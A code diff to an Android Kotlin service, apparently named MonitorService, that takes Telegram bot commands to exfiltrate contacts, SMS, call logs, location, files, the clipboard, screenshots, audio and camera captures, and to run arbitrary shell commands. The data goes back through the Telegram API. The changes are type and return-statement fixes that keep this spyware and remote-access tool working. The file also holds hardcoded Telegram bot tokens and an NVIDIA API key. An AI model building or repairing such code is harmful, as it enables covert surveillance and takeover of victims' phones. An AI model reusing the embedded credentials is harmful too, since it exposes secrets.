@@ -27,13 +27,13 @@ import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
+import com.google.gson.reflect.TypeToken
 import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody
 import okhttp3.Response
-import okio.toMediaType
 import java.io.File
 import java.nio.charset.StandardCharsets
 import java.util.ArrayList
@@ -50,7 +50,7 @@ const val KEY_PERSISTENT = "persistent_mode"
 const val KEY_ONBOARD_SENT = "onboard_sent"
 const val KEY_TEST_SENT = "test_sent"
 
-const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
+const val BOT_TOKEN = "9168397709:AAEVVXnjTtxUm76KCfBJENNiQSg-MyqgN4M"
 const val ALLOWED_USER_ID = 8335972628L
 const val TELEGRAM_API = "https://api.telegram.org/bot"
 const val NVIDIA_API_KEY = "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"
@@ -245,33 +245,33 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "contacts", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "sms", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", hashMapOf<String, Any>())
+            sendTelegramTask(chatId, "call_logs", hashMapOf<String, Any>() as Map<String, Any>)
         } else if (trimmed == "/apps") {
-            sendTelegramTask(chatId, "apps", hashMapOf<String, Any>("action" to "list"))
+            sendTelegramTask(chatId, "apps", hashMapOf<String, Any>("action" to "list") as Map<String, Any>)
         } else if (trimmed == "/location") {
-            sendTelegramTask(chatId, "location", hashMapOf<String, Any>("action" to "get"))
+            sendTelegramTask(chatId, "location", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
         } else if (trimmed == "/files") {
-            sendTelegramTask(chatId, "files", hashMapOf<String, Any>("action" to "list", "path" to "/sdcard"))
+            sendTelegramTask(chatId, "files", hashMapOf<String, Any>("action" to "list", "path" to "/sdcard") as Map<String, Any>)
         } else if (trimmed == "/wifi") {
-            sendTelegramTask(chatId, "wifi", hashMapOf<String, Any>("action" to "scan"))
+            sendTelegramTask(chatId, "wifi", hashMapOf<String, Any>("action" to "scan") as Map<String, Any>)
         } else if (trimmed == "/clipboard") {
-            sendTelegramTask(chatId, "clipboard", hashMapOf<String, Any>("action" to "get"))
+            sendTelegramTask(chatId, "clipboard", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
         } else if (trimmed == "/screenshot") {
-            sendTelegramTask(chatId, "screen", hashMapOf<String, Any>("action" to "capture"))
+            sendTelegramTask(chatId, "screen", hashMapOf<String, Any>("action" to "capture") as Map<String, Any>)
         } else if (trimmed == "/audio") {
-            sendTelegramTask(chatId, "audio", hashMapOf<String, Any>("action" to "start", "duration" to 10))
+            sendTelegramTask(chatId, "audio", hashMapOf<String, Any>("action" to "start", "duration" to 10) as Map<String, Any>)
         } else if (trimmed == "/camera") {
-            sendTelegramTask(chatId, "camera", hashMapOf<String, Any>("action" to "capture", "camera" to 0))
+            sendTelegramTask(chatId, "camera", hashMapOf<String, Any>("action" to "capture", "camera" to 0) as Map<String, Any>)
         } else if (trimmed.startsWith("/ai ")) {
             handleAiCommand(chatId, trimmed.substring(4).trim())
         } else if (trimmed.startsWith("/auto ")) {
             handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
         } else if (trimmed.startsWith("/shell ")) {
-            sendTelegramTask(chatId, "shell", hashMapOf<String, Any>("command" to trimmed.substring(7).trim()))
+            sendTelegramTask(chatId, "shell", hashMapOf<String, Any>("command" to trimmed.substring(7).trim()) as Map<String, Any>)
         } else {
             sendTelegramMessage(chatId, "Unknown. Use /help")
         }
@@ -336,7 +336,7 @@ class MonitorService : Service() {
 
     @Suppress("DEPRECATION")
     private fun executeCapability(capability: String, argsJson: String): Any {
-        val args = gson.fromJson(argsJson, Map<String, Any>::class.java)
+        val args = gson.fromJson(argsJson, object : TypeToken<Map<String, Any>>() {}.type)
         return when (capability) {
             "contacts" -> getContacts()
             "sms" -> getSms()
@@ -479,7 +479,7 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) hashMapOf<String, Any>("error" to "Not a directory") as Map<String, Any>
+                if (!dir.exists() || !dir.isDirectory) return hashMapOf<String, Any>("error" to "Not a directory") as Map<String, Any>
                 else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
@@ -492,14 +492,14 @@ class MonitorService : Service() {
                             ) as Map<String, Any>
                         } catch (e: Exception) { null }
                     } ?: ArrayList<Map<String, Any>>() as List<Map<String, Any>>
-                    hashMapOf<String, Any>(
+                    return hashMapOf<String, Any>(
                         "files" to files.take(200),
                         "path" to path,
                         "count" to files.size
                     ) as Map<String, Any>
                 }
             }
-            else -> hashMapOf<String, Any>("error" to "Unknown action") as Map<String, Any>
+            else -> return hashMapOf<String, Any>("error" to "Unknown action") as Map<String, Any>
         }
     }
 
@@ -608,20 +608,20 @@ class MonitorService : Service() {
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
                     }, "audio-stop").start()
-                    hashMapOf<String, Any>(
+                    return hashMapOf<String, Any>(
                         "status" to "recording",
                         "duration" to duration,
                         "file" to outputFile.absolutePath
                     ) as Map<String, Any>
                 } catch (e: Exception) {
-                    hashMapOf<String, Any>("error" to (e.message ?: "Audio start failed")) as Map<String, Any>
+                    return hashMapOf<String, Any>("error" to (e.message ?: "Audio start failed")) as Map<String, Any>
                 }
             }
             "stop" -> {
                 stopRecording()
-                hashMapOf<String, Any>("status" to "stopped") as Map<String, Any>
+                return hashMapOf<String, Any>("status" to "stopped") as Map<String, Any>
             }
-            else -> hashMapOf<String, Any>("error" to "Unknown audio action") as Map<String, Any>
+            else -> return hashMapOf<String, Any>("error" to "Unknown audio action") as Map<String, Any>
         }
     }
 
